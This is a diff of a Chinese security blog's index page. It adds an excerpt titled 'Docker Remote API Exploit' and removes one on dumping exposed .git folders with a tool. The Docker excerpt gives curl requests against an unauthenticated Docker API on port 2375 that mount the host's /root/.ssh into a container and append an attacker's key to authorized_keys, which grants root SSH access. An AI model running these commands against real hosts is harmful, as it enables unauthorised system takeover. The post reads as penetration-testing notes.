@@ -117,6 +117,70 @@
 <div class="row">
 	<div class="col-md-8">
 		<h3 class="title">
+			<a href="/2016/05/18/docker-remote-exploit.html" >Docker Remote API Exploit</a>
+		</h3>
+		</div>
+	<div class="col-md-4">
+		<div class="date">post @ 2016-05-18  </div>
+		</div>
+	</div>
+	
+
+
+			<!--
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Source:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
+<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
+</ul>
+<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
+<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
+<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
+<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
+<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
+<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
+	
+
+	</div>
+  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+-->
+<div class="entry">
+  <div class="row">
+	
+	
+		<p>Source:</p>
+<ul>
+<li><a target="_blank" rel="noopener" href="http://drops.wooyun.org/papers/15892">http://drops.wooyun.org/papers/15892</a></li>
+<li><a target="_blank" rel="noopener" href="http://zone.wooyun.org/content/27302">http://zone.wooyun.org/content/27302</a></li>
+</ul>
+<p>昨天下午和今天上午一起和@ccst同学查资料讨论了下，以下是结果：</p>
+<p>可以按照zone里面说的，直接使用docker本地客户端进行shell反弹，安装docker: <code>curl -sSL https://get.docker.com/ | sh </code>，如果在链接的时候提示client版本高于服务器版本可以这样子:<code>export DOCKER_API_VERSION=1.9.0</code>，后面的版本自己定。</p>
+<p>另外一种方法就是直接使用Remote API，把本地<code>id_rsa.pub</code>写入到远程宿主机的<code>/root/.ssh/authorized_keys</code>。</p>
+<p>先创建<code>container</code>,同时把宿主机的<code>/root/.ssh</code>挂载到docker的<code>container</code>某个目录，比如<code>/tmp</code>:</p>
+<pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">curl</span>  -X POST  -H <span class="token string">"Content-Type: application/json"</span>  -d <span class="token string">'&#123; "Cmd": [ "/bin/sh", "-c", " echo \"公钥\" >> /tmp/authorized_keys " ], "Image": "sshd", "Volumes": &#123; "/tmp": &#123;&#125; &#125;, "HostConfig": &#123; "Binds": ["/root/.ssh:/tmp:rw"] &#125; &#125; '</span> <span class="token string">"http://10.20.30.40:2375/containers/create"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>上面的创建create中的<code>Image</code>可以先远程查看有哪些image: <code>curl -v http://10.20.30.40:2375/images/json</code>，这样会列出所有的<code>image</code>，从其中跳出来一个像这样的</p>
+<p><code>&quot;RepoTags&quot;: [             &quot;nginx:latest&quot;         ],</code> 注意<code>nginx</code>后面有一个<code>latest</code>。创建的时候指定<code>image</code>，尽可能找有<code>latest</code>的image，</p>
+<p>以上命令会返回创建好的<code>container</code>的<code>id</code>然后启动<code>container</code>: <code>curl -X POST http://10.20.30.40:2375/containers/id/start</code></p>
+	
+	</div>
+  <a type="button" href="/2016/05/18/docker-remote-exploit.html#more" class="btn btn-default more">Read More</a>
+</div>
+
+		
+			
+	
+	<!-- display as entry -->
+<div class="row">
+	<div class="col-md-8">
+		<h3 class="title">
 			<a href="/2016/05/05/sqli-labs-less-16.html" >SQL报错注入</a>
 		</h3>
 		</div>
@@ -817,70 +881,6 @@ XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token 
 </div>
 
 		
-			
-	
-	<!-- display as entry -->
-<div class="row">
-	<div class="col-md-8">
-		<h3 class="title">
-			<a href="/2016/03/30/git-folder-exploit.html" >Git folder exploit</a>
-		</h3>
-		</div>
-	<div class="col-md-4">
-		<div class="date">post @ 2016-03-30  </div>
-		</div>
-	</div>
-	
-
-
-			<!--
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/JKme/gitback">gitback.py</a></li>
-</ul>
-<p>当部署线上项目的时候可能会把git代码仓库一起部署上去，造成的结果就是<code>.git</code>文件夹泄漏，由此可以根据<code>.git/index</code>来知道对应的压缩文件名字，下载之后解压缩即可得到源代码。这个程序是根据lijiejie的<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>更改过来的。</p>
-<p>因为<code>githack</code>使用的是socket直接read(）之后解压缩，如果文件太大会造成卡死。不管是<code>githack</code>还是<code>rip-git</code>，在下载文件的时候，如果文件不存在，而且服务器设置了302跳转的话，就会下载跳转那个页面，最后会导致下载好多重复文件。</p>
-<p>所以我在源代码的基础上更改了下，先下载git压缩文件，然后再解压缩到对应的名称，如果文件不存在，服务器跳转，就pass。中间碰到几个问题如下：</p>
-<h2 id="使用requests碰到的问题"><a href="#使用requests碰到的问题" class="headerlink" title="使用requests碰到的问题"></a>使用requests碰到的问题</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul>
-<li><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">官方文档</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li>
-</ul>
-<p> 简单来说，<code>Timeouts</code>可以是一个元组，第一个数值代表的是<code>connect</code>的<code>timeout</code>，第二个数值表示<code>read</code>的<code>timeout</code>，在这里<code>read</code>的<code>timeout</code>表示的是<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, it’s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p>
-<h4 id="下载大文件"><a href="#下载大文件" class="headerlink" title="下载大文件"></a>下载大文件</h4><p>使用requests，所以下载的时候不需要担心steam=True的情况，直接使用。</p>
-	
-
-	</div>
-  <a type="button" href="/2016/03/30/git-folder-exploit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
--->
-<div class="entry">
-  <div class="row">
-	
-	
-		<ul>
-<li><a target="_blank" rel="noopener" href="https://github.com/JKme/gitback">gitback.py</a></li>
-</ul>
-<p>当部署线上项目的时候可能会把git代码仓库一起部署上去，造成的结果就是<code>.git</code>文件夹泄漏，由此可以根据<code>.git/index</code>来知道对应的压缩文件名字，下载之后解压缩即可得到源代码。这个程序是根据lijiejie的<a target="_blank" rel="noopener" href="https://github.com/lijiejie/GitHack">githack</a>更改过来的。</p>
-<p>因为<code>githack</code>使用的是socket直接read(）之后解压缩，如果文件太大会造成卡死。不管是<code>githack</code>还是<code>rip-git</code>，在下载文件的时候，如果文件不存在，而且服务器设置了302跳转的话，就会下载跳转那个页面，最后会导致下载好多重复文件。</p>
-<p>所以我在源代码的基础上更改了下，先下载git压缩文件，然后再解压缩到对应的名称，如果文件不存在，服务器跳转，就pass。中间碰到几个问题如下：</p>
-<h2 id="使用requests碰到的问题"><a href="#使用requests碰到的问题" class="headerlink" title="使用requests碰到的问题"></a>使用requests碰到的问题</h2><h4 id="timeout"><a href="#timeout" class="headerlink" title="timeout()"></a>timeout()</h4><ul>
-<li><a target="_blank" rel="noopener" href="http://stackoverflow.com/questions/17782142/why-doesnt-requests-get-return-what-is-the-default-timeout-that-requests-get">stackoverflow</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/kevinburke/requests/blob/connect-timeout/docs/user/advanced.rst#timeouts">官方文档</a></li>
-<li><a target="_blank" rel="noopener" href="https://github.com/kennethreitz/requests/pull/1801">Issue</a></li>
-</ul>
-<p> 简单来说，<code>Timeouts</code>可以是一个元组，第一个数值代表的是<code>connect</code>的<code>timeout</code>，第二个数值表示<code>read</code>的<code>timeout</code>，在这里<code>read</code>的<code>timeout</code>表示的是<strong>is the     number of seconds the client will wait for the     server to send a response,(Specifically, it’s the     number of seconds that the client will wait     between bytes sent from the server. In practice,     this is the time before the server sends the first     byte)</strong></p>
-<h4 id="下载大文件"><a href="#下载大文件" class="headerlink" title="下载大文件"></a>下载大文件</h4><p>使用requests，所以下载的时候不需要担心steam=True的情况，直接使用。</p>
-	
-	</div>
-  <a type="button" href="/2016/03/30/git-folder-exploit.html#more" class="btn btn-default more">Read More</a>
-</div>
-
-		
 
 		</div>
 
@@ -896,7 +896,7 @@ XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token 
 
         <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
  
-          <a type="button" class="btn btn-default disabled">Next<i class="fa fa-arrow-circle-o-right"></i></a>
+       <a href="/page/17/" type="button" class="btn btn-default ">Next<i class="fa fa-arrow-circle-o-right"></i></a>     
         
 
   
@@ -936,7 +936,7 @@ XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token 
 		
 			<li><a href="/categories/PWN/">PWN<span>2</span></a></li>
 		
-			<li><a href="/categories/Pentest/">Pentest<span>43</span></a></li>
+			<li><a href="/categories/Pentest/">Pentest<span>44</span></a></li>
 		
 			<li><a href="/categories/Python/">Python<span>5</span></a></li>
 		
@@ -957,6 +957,10 @@ XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token 
   <ul class="entry list-unstyled">
     
       <li>
+        <a href="/2022/03/21/jndi-exec-by-mvel.html" ><i class="fa fa-file-o"></i>JNDI Bypass - MVEL</a>
+      </li>
+    
+      <li>
         <a href="/2022/03/18/from-spring-boot-to-getshell.html" ><i class="fa fa-file-o"></i>从Spring Boot H2 Database到Ge...</a>
       </li>
     
@@ -970,10 +974,6 @@ XTMP_STRUCT_SIZE <span class="token operator">=</span> struct<span class="token 
     
       <li>
         <a href="/2021/07/29/silverFish.html" ><i class="fa fa-file-o"></i>Silver调查报告</a>
-      </li>
-    
-      <li>
-        <a href="/2021/05/27/spring-boot-actuator.html" ><i class="fa fa-file-o"></i>Spring Boot Actuator漏洞复现</a>
       </li>
     
   </ul>
